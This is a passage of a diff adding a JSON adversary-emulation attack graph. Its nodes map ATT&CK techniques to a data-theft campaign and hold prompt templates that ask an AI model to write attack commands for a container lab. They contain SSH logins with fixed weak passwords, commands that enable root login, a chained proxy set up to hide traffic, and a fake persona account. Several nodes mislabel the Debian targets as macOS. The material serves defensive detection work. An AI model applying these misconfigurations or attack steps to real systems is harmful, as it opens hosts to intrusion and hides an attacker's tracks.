+        "echo \"Test email from attacker\" | mail -s \"Test Subject\" shinycorp@tuta.com -S smtp=172.21.0.20"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y postfix mailutils && printf 'root: shinycorp@tuta.com\\n' > /etc/aliases && newaliases && /usr/sbin/postfix start"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "632d1194-f237-4866-9955-876afe5c66a9"
+      ],
+      "child_nodes": [
+        "60314478-c12d-4b58-a1e6-61b0266e35a9"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1585.002 - Email Accounts\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors registered emails shinycorp@tuta[.]com and shinygroup@tuta[.]com to send victims extortion demands.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to Acquire Infrastructure for follow-on purposes.\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "60314478-c12d-4b58-a1e6-61b0266e35a9",
+      "node_index": 9,
+      "node_type": "structural",
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).\nSome files and directories may require elevated or specific user permissions to access.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors queried customers' Salesforce environments to identify sensitive information for exfiltration.",
+      "required_prerequisites": [
+        "access:target"
+      ],
+      "provides": [
+        "user_info",
+        "discovered_info",
+        "network_info",
+        "system_info"
+      ],
+      "attacker_commands": [
+        "ssh attacker@172.21.0.20 'ls -la / && find / -maxdepth 2 -type d'"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip && pip install --break-system-packages paramiko && useradd -m attacker && echo 'attacker:Password123!' | chpasswd && mkdir -p /home/attacker/.ssh && ssh-keygen -t rsa -f /home/attacker/.ssh/id_rsa -N '' && cat /home/attacker/.ssh/id_rsa.pub >> /home/attacker/.ssh/authorized_keys && chown -R attacker:attacker /home/attacker/.ssh && chmod 700 /home/attacker/.ssh && chmod 600 /home/attacker/.ssh/authorized_keys && /usr/sbin/sshd -D &"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "ead35c74-f5b4-4815-84be-4ab46417f14e"
+      ],
+      "child_nodes": [
+        "324222fc-6b0e-4c6e-be4f-af4341b9638e"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1083 - File and Directory Discovery\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors queried customers' Salesforce environments to identify sensitive information for exfiltration.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).\nSome files and directories may require elevated or specific user permissions to access.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:target"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "324222fc-6b0e-4c6e-be4f-af4341b9638e",
+      "node_index": 10,
+      "node_type": "structural",
+      "technique_id": "T1090.003",
+      "technique_name": "Multi-hop Proxy",
+      "tactic": "command-and-control",
+      "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\nFor example, adversaries may construct or use onion routing networks – such as the publicly available Tor network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network. Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations. \nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN). Protocols such as ICMP may be used as a transport. \nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used Tor IPs for voice calls and for the collection of stolen data.",
+      "required_prerequisites": [
+        "access:initial",
+        "network:egress_allowed"
+      ],
+      "provides": [
+        "c2_channel"
+      ],
+      "attacker_commands": [
+        "curl --proxy http://172.21.0.20:8888 --proxy http://172.22.0.20:8888 http://example.com"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y tinyproxy && printf 'Allow 172.22.0.20\\nListen 8888\\nTimeout 600\\nLogFile \"/var/log/tinyproxy/tinyproxy.log\"\\nPidFile \"/var/run/tinyproxy.pid\"\\nUser nobody\\nGroup nogroup\\n' > /etc/tinyproxy/tinyproxy.conf && /usr/bin/tinyproxy &"
+      ],
+      "target_vuln_host_b": [
+        "apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y tinyproxy && printf 'Allow 172.21.0.20\\nListen 8888\\nTimeout 600\\nLogFile \"/var/log/tinyproxy/tinyproxy.log\"\\nPidFile \"/var/run/tinyproxy.pid\"\\nUser nobody\\nGroup nogroup\\n' > /etc/tinyproxy/tinyproxy.conf && /usr/bin/tinyproxy &"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Host A can initiate outbound connections (from pre-prompt)",
+      "parent_nodes": [
+        "60314478-c12d-4b58-a1e6-61b0266e35a9"
+      ],
+      "child_nodes": [
+        "cfac895c-b867-4a99-a75f-8ebc9ea7a627"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1090.003 - Multi-hop Proxy\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used Tor IPs for voice calls and for the collection of stolen data.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\nFor example, adversaries may construct or use onion routing networks – such as the publicly available Tor network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network. Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations. \nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN). Protocols such as ICMP may be used as a transport. \nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:initial",
+        "network:egress_allowed"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "cfac895c-b867-4a99-a75f-8ebc9ea7a627",
+      "node_index": 11,
+      "node_type": "structural",
+      "technique_id": "T1585",
+      "technique_name": "Establish Accounts",
+      "tactic": "resource-development",
+      "description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing. In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors created Salesforce trial accounts to register their malicious applications.",
+      "required_prerequisites": [],
+      "provides": [
+        "resources",
+        "infrastructure"
+      ],
+      "attacker_commands": [
+        "sshpass -p 'RootPass123!' ssh -o StrictHostKeyChecking=no root@172.21.0.20 \"useradd -m fakepersona && echo 'fakepersona:FakePass123!' | chpasswd\"",
+        "sshpass -p 'FakePass123!' ssh -o StrictHostKeyChecking=no fakepersona@172.21.0.20 \"curl -s -L https://github.com/cli/cli/releases/latest/download/gh_2.32.0_linux_amd64.tar.gz | tar xz && mv gh_2.32.0_linux_amd64/bin/gh /tmp/gh && chmod +x /tmp/gh\"",
+        "sshpass -p 'FakePass123!' ssh -o StrictHostKeyChecking=no fakepersona@172.21.0.20 \"/tmp/gh auth login --with-token <(echo 'ghp_exampletoken1234567890')\"",
+        "sshpass -p 'FakePass123!' ssh -o StrictHostKeyChecking=no fakepersona@172.21.0.20 \"/tmp/gh api users/fakepersona --jq '.login,.name,.bio' > /tmp/profile.txt\""
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip curl openssh-server && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'root:RootPass123!' | chpasswd && mkdir -p /var/run/sshd && /usr/sbin/sshd && useradd -m attackeruser && echo 'attackeruser:UserPass123!' | chpasswd"
+      ],
+      "target_vuln_host_b": [
+        "apt-get update && apt-get install -y python3 python3-pip curl openssh-server && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'root:RootPass123!' | chpasswd && mkdir -p /var/run/sshd && /usr/sbin/sshd && useradd attackeruser && echo 'attackeruser:UserPass123!' | chpasswd"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "324222fc-6b0e-4c6e-be4f-af4341b9638e"
+      ],
+      "child_nodes": [
+        "81c697e5-93ad-4fba-a95c-d8ccc24d177c"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1585 - Establish Accounts\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors created Salesforce trial accounts to register their malicious applications.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing. In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "81c697e5-93ad-4fba-a95c-d8ccc24d177c",
+      "node_index": 12,
+      "node_type": "structural",
+      "technique_id": "T1587.001",
+      "technique_name": "Malware",
+      "tactic": "resource-development",
+      "description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\nDuring malware development, adversaries may intentionally include indicators aligned with other known actors in order to mislead attribution by defenders.\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors created malicious applications within Salesforce trial accounts, typically Python scripts with similar function to the Salesforce Data Loader.",
